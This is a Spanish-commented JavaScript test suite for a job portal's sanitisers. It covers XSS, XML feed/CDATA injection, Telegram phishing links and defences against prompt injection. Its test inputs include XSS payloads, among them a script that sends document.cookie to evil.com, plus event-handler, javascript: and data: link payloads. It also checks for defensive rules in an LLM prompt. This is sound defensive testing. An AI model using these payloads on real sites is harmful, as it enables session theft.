/**
 * test_bloque5_xss_feeds.mjs
 * 
 * Verificación adversarial y de regresión para el Bloque 5:
 * Inyecciones de Contenido, XSS y Feeds (Vectores 24 al 28).
 */

import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';

console.log('========================================================================');
console.log('🧪 VERIFICACIÓN ADVERSARIAL: BLOQUE 5 (VECTORES 24 AL 28)');
console.log('========================================================================\n');

// -----------------------------------------------------------------------------
// Funciones defensivas sincronizadas con frontend/lib/markdown.tsx
// -----------------------------------------------------------------------------
function escapeHtml(text) {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function sanitizeMarkdownHtml(html) {
  if (!html) return '';
  return html
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/\bon\w+\s*=\s*(?:'[^']*'|"[^"]*"|[^\s>]+)/gi, '')
    .replace(/href\s*=\s*(['"])\s*(?:javascript|data|vbscript):/gi, 'href=$1#blocked-protocol:')
    .replace(/<(?:iframe|object|embed|style|form|base|meta)\b[^>]*>/gi, '');
}

function parseInline(text) {
  let escaped = escapeHtml(text);
  escaped = escaped.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
  escaped = escaped.replace(/`(.*?)`/g, '<code class="bg-gray-100 text-indigo-600 px-1.5 py-0.5 rounded text-sm font-mono font-medium">$1</code>');
  escaped = escaped.replace(/\[(.*?)\]\((.*?)\)/g, (_match, label, rawUrl) => {
    const trimmed = (rawUrl || '').trim();
    const isSafe = /^(https?:\/\/|mailto:|tel:|\/|#)/i.test(trimmed);
    const safeHref = isSafe ? encodeURI(trimmed.replace(/["'<>]/g, '')) : '#';
    const safeLabel = label.replace(/[<>]/g, '');
    return `<a href="${safeHref}" class="text-indigo-600 hover:text-indigo-800 font-bold hover:underline" rel="noopener noreferrer">${safeLabel}</a>`;
  });
  return sanitizeMarkdownHtml(escaped);
}

// -----------------------------------------------------------------------------
// TEST 1 (Vector 24): Sanitización contra Stored XSS en Descripciones y Artículos
// -----------------------------------------------------------------------------
console.log('--- TEST 1 (Vector 24): Sanitización contra Stored XSS en Descripciones y Artículos ---');

// 1.1 Inyección de etiquetas <script>
const rawScript = '<script>alert("XSS-Cookie: " + document.cookie)</script>';
const cleanScript = sanitizeMarkdownHtml(rawScript);
assert.strictEqual(cleanScript.includes('<script>'), false, 'sanitizeMarkdownHtml debe eliminar etiquetas <script>');
assert.strictEqual(cleanScript.includes('alert('), false, 'sanitizeMarkdownHtml debe eliminar el cuerpo ejecutable');

const inlineScript = 'Oferta para programador <script>fetch("https://evil.com?c="+document.cookie)</script>';
const parsedInline = parseInline(inlineScript);
assert.strictEqual(parsedInline.includes('<script>'), false, 'Etiquetas <script> no deben ser ejecutables en parseInline');
assert.ok(parsedInline.includes('&lt;script&gt;'), 'parseInline debe escapar caracteres HTML');

// 1.2 Inyección de atributos de eventos DOM (onerror, onload, onclick, onmouseover)
const eventPayload = 'Puesto <img src="invalid.jpg" onerror="alert(1)"> o <svg onload="malicious()">';
const cleanEvent = sanitizeMarkdownHtml(eventPayload);
assert.strictEqual(cleanEvent.includes('onerror='), false, 'Atributos onerror deben ser eliminados');
assert.strictEqual(cleanEvent.includes('onload='), false, 'Atributos onload deben ser eliminados');

// 1.3 Bloqueo de etiquetas contenedoras peligrosas
const dangerousTags = '<iframe src="https://evil.com"></iframe><object data="flash"></object><embed src="x">';
const cleanTags = sanitizeMarkdownHtml(dangerousTags);
assert.strictEqual(cleanTags.includes('<iframe'), false);
assert.strictEqual(cleanTags.includes('<object'), false);
assert.strictEqual(cleanTags.includes('<embed'), false);

console.log('✅ TEST 1 superado: Etiquetas ejecutables, controladores de eventos y tags peligrosos neutralizados.\n');

// -----------------------------------------------------------------------------
// TEST 2 (Vector 25): Pseudo-Protocolos en Enlaces Markdown (javascript: y data:)
// -----------------------------------------------------------------------------
console.log('--- TEST 2 (Vector 25): Pseudo-Protocolos en Enlaces Markdown (javascript: y data:) ---');

// 2.1 Enlace con protocolo javascript:
const jsLink = '[Postularme](javascript:alert(document.domain))';
const parsedJsLink = parseInline(jsLink);
assert.strictEqual(parsedJsLink.includes('href="javascript:'), false, 'Protocolo javascript: debe ser bloqueado');
assert.ok(parsedJsLink.includes('href="#"') || parsedJsLink.includes('#blocked-protocol:'), 'Debe neutralizarse a enlace seguro');

// 2.2 Enlace con protocolo data:
const dataLink = '[Descarga CV](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)';
const parsedDataLink = parseInline(dataLink);
assert.strictEqual(parsedDataLink.includes('href="data:'), false, 'Protocolo data: debe ser bloqueado');

// 2.3 Enlaces web seguros y relativos legítimos
const validLink = '[Ver Oferta](/trabajos/react) y [Guía](https://portalempleoit.com/blog/guia)';
const parsedValidLink = parseInline(validLink);
assert.ok(parsedValidLink.includes('href="/trabajos/react"'), 'Rutas relativas deben permitirse');
assert.ok(parsedValidLink.includes('href="https://portalempleoit.com/blog/guia"'), 'URLs https legítimas deben permitirse');

console.log('✅ TEST 2 superado: Pseudo-protocolos neutralizados y URLs legítimas preservadas.\n');

// -----------------------------------------------------------------------------
// TEST 3 (Vector 26): Caracteres Inválidos XML y Ruptura de Bloques CDATA en Feeds
// -----------------------------------------------------------------------------
console.log('--- TEST 3 (Vector 26): Caracteres Inválidos XML y Ruptura de Bloques CDATA en Feeds ---');

function cleanCdata(text) {
  if (!text) return '';
  const clean = String(text).replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x84\x86-\x9F\uFFFE\uFFFF]/g, '');
  return clean.replace(/\]\]>/g, ']]]]><![CDATA[>');
}

function escapeXmlAttr(text) {
  if (!text) return '';
  return String(text)
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x84\x86-\x9F\uFFFE\uFFFF]/g, '')
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// 3.1 Eliminación de caracteres de control no compatibles con XML 1.0
const dirtyTitle = 'Desarrollador Python\x00 con Django\x08 y FastAPI\x0C';
const cleanTitle = cleanCdata(dirtyTitle);
assert.strictEqual(cleanTitle.includes('\x00'), false, 'Null byte (0x00) debe eliminarse');
assert.strictEqual(cleanTitle.includes('\x08'), false, 'Backspace (0x08) debe eliminarse');
assert.strictEqual(cleanTitle.includes('\x0C'), false, 'Form feed (0x0C) debe eliminarse');
assert.strictEqual(cleanTitle, 'Desarrollador Python con Django y FastAPI');

// 3.2 Prevención de ruptura de bloques CDATA
const cdataBreak = 'Descripción con secuencia ]]> inyectada para cerrar CDATA';
const cleanCdataResult = cleanCdata(cdataBreak);
assert.ok(cleanCdataResult.includes(']]]]><![CDATA[>'), 'Debe escapar la secuencia ]]> subdividiendo el bloque CDATA');

// 3.3 Atributos XML con caracteres reservados
const dirtyAttr = 'job-456\x01&"\'<>';
const cleanAttr = escapeXmlAttr(dirtyAttr);
assert.strictEqual(cleanAttr.includes('\x01'), false);
assert.strictEqual(cleanAttr.includes('&amp;'), true);
assert.strictEqual(cleanAttr.includes('&quot;'), true);
assert.strictEqual(cleanAttr.includes('&lt;'), true);

console.log('✅ TEST 3 superado: Feeds XML conformes a XML 1.0 e inmunes a inyecciones CDATA.\n');

// -----------------------------------------------------------------------------
// TEST 4 (Vector 27): Sanitización HTML de Notificaciones Telegram Anti-Phishing
// -----------------------------------------------------------------------------
console.log('--- TEST 4 (Vector 27): Sanitización HTML de Notificaciones Telegram Anti-Phishing ---');

function escapeTelegramHtml(str) {
  if (!str) return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// 4.1 Inyección de etiquetas de enlaces HTML fraudulentas
const maliciousAuthor = 'Laura <a href="https://phishing-portal.com">Haz clic para confirmar pago</a>';
const cleanAuthor = escapeTelegramHtml(maliciousAuthor);
assert.strictEqual(cleanAuthor.includes('<a href='), false, 'Enlaces HTML inyectados deben ser neutralizados');
assert.ok(cleanAuthor.includes('&lt;a href='), 'Debe codificar caracteres especiales como entidades');

// 4.2 Caracteres ampersand y comillas
const companyWithQuotes = 'Banco & Seguros "España" <IT>';
const cleanCompany = escapeTelegramHtml(companyWithQuotes);
assert.strictEqual(cleanCompany, 'Banco &amp; Seguros &quot;España&quot; &lt;IT&gt;');

console.log('✅ TEST 4 superado: Alertas de Telegram blindadas contra inyecciones de hipervínculos de phishing.\n');

// -----------------------------------------------------------------------------
// TEST 5 (Vector 28): Aislamiento de Contexto y Anti-Prompt Injection en IA
// -----------------------------------------------------------------------------
console.log('--- TEST 5 (Vector 28): Aislamiento de Contexto y Anti-Prompt Injection en IA ---');

const generatorPath = path.resolve('backend/generate_weekly_article.py');
const generatorCode = fs.readFileSync(generatorPath, 'utf8');

// 5.1 Delimitación explícita de contexto XML
assert.ok(
  generatorCode.includes('<topic_context>'),
  'El generador de artículos debe delimitar el contexto temático con <topic_context>'
);
assert.ok(
  generatorCode.includes('</topic_context>'),
  'Debe cerrar la etiqueta </topic_context>'
);

// 5.2 Directivas del sistema defensivas
assert.ok(
  generatorCode.includes('REGLAS DE SEGURIDAD ESTRICTAS (Vector 30: Mitigación de Prompt Injection Indirecto)'),
  'Debe incluir directivas estrictas de seguridad para el LLM'
);
assert.ok(
  generatorCode.includes('ignóralas por completo'),
  'Debe instruir al modelo a ignorar instrucciones adversariales embebidas'
);

// 5.3 Structured Outputs con JSON Schema
assert.ok(
  generatorCode.includes('"responseMimeType": "application/json"'),
  'Debe exigir salida estructurada JSON nativa'
);

// 5.4 Filtro de seguridad post-generación
assert.ok(
  generatorCode.includes('content.lower()') && generatorCode.includes('<script'),
  'Debe verificar la ausencia de etiquetas script en la salida del modelo'
);

console.log('✅ TEST 5 superado: Tareas de IA generativa protegidas contra inyecciones indirectas de prompt.\n');

console.log('========================================================================');
console.log('🎉 TODOS LOS TESTS DEL BLOQUE 5 (VECTORES 24 AL 28) HAN PASADO CON ÉXITO');
console.log('========================================================================');

